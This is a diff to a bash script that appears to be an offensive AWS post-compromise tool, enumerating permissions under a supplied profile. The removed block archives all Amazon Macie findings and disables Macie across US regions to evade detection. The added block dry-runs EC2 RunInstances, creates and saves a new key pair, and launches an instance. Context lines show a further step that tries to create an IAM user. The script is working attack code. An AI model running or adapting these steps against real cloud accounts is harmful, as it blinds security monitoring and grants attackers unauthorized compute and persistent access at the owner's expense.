@@ -8,6 +8,7 @@ NC='\033[0m' # No Color
 
 # Default profile if none specified
 AWS_PROFILE=${1:-default}
+AWS_DEFAULT_REGION=us-west-1
 
 echo "${YELLOW}[*] Starting AWS permission enumeration using profile: ${AWS_PROFILE}...${NC}\n"
 
@@ -47,29 +48,31 @@ done
 echo "\n${GREEN}[+] Listing EC2 instances...${NC}"
 aws --profile ${AWS_PROFILE} ec2 describe-instances
 
-# 7. Check and attempt to disable Macie in all US regions
-echo "\n${GREEN}[+] Checking for Macie in all US regions and attempting to disable...${NC}"
-US_REGIONS=("us-east-1" "us-east-2" "us-west-1" "us-west-2")
-for region in "${US_REGIONS[@]}"; do
-    echo "${YELLOW}[*] Checking Macie status in $region...${NC}"
-    macie_status=$(aws --profile ${AWS_PROFILE} --region $region macie2 get-macie-status 2>/dev/null)
-    if echo "$macie_status" | grep -q '"status": "ENABLED"'; then
-        echo "${RED}[!] Macie is ENABLED in $region. Archiving all findings before disabling...${NC}"
-        # Archive all findings in the region
-        FINDING_IDS=$(aws --profile ${AWS_PROFILE} --region $region macie2 list-findings --query 'findingIds' --output text 2>/dev/null)
-        if [ -n "$FINDING_IDS" ]; then
-            for finding_id in $FINDING_IDS; do
-                aws --profile ${AWS_PROFILE} --region $region macie2 archive-findings --finding-ids $finding_id
-            done
-        else
-            echo "${GREEN}[+] No findings to archive in $region.${NC}"
-        fi
-        echo "${RED}[!] Attempting to disable Macie in $region...${NC}"
-        aws --profile ${AWS_PROFILE} --region $region macie2 disable-macie
+# 7. Check for EC2 RunInstances permission and attempt to launch an instance if allowed
+echo "\n${GREEN}[+] Checking EC2 RunInstances permission...${NC}"
+aws --profile ${AWS_PROFILE} ec2 describe-instance-types --max-items 1 >/dev/null 2>&1
+if aws --profile ${AWS_PROFILE} ec2 run-instances --dry-run --image-id ami-07706bb32254a7fe5 --instance-type t2.micro >/dev/null 2>&1; then
+    echo "${GREEN}[+] EC2 RunInstances permission confirmed. Attempting to launch a t2.micro instance...${NC}"
+    # 7a. Check if we can create a key pair
+    KEY_NAME="test-key-$(date +%s)"
+    KEY_FILE="${KEY_NAME}.pem"
+    if aws --profile ${AWS_PROFILE} ec2 create-key-pair --key-name $KEY_NAME --query 'KeyMaterial' --output text > $KEY_FILE 2>/dev/null; then
+        chmod 400 $KEY_FILE
+        echo "${GREEN}[+] Created new key pair: $KEY_NAME and saved to $KEY_FILE${NC}"
+        KEY_OPTION="--key-name $KEY_NAME"
     else
-        echo "${GREEN}[+] Macie is not enabled in $region.${NC}"
+        echo "${YELLOW}[!] Could not create key pair. Proceeding without SSH key.${NC}"
+        KEY_OPTION=""
     fi
-done
+    INSTANCE_ID=$(aws --profile ${AWS_PROFILE} ec2 run-instances --image-id ami-07706bb32254a7fe5 --instance-type t2.micro $KEY_OPTION --query 'Instances[0].InstanceId' --output text)
+    if [ -n "$INSTANCE_ID" ]; then
+        echo "${GREEN}[+] Launched EC2 instance: $INSTANCE_ID${NC}"
+    else
+        echo "${RED}[!] Failed to launch EC2 instance.${NC}"
+    fi
+else
+    echo "${YELLOW}[!] No EC2 RunInstances permission or unable to launch instance.${NC}"
+fi
 
 # 8. Try to create a new IAM user
 echo "\n${GREEN}[+] Attempting to create a new IAM user...${NC}"
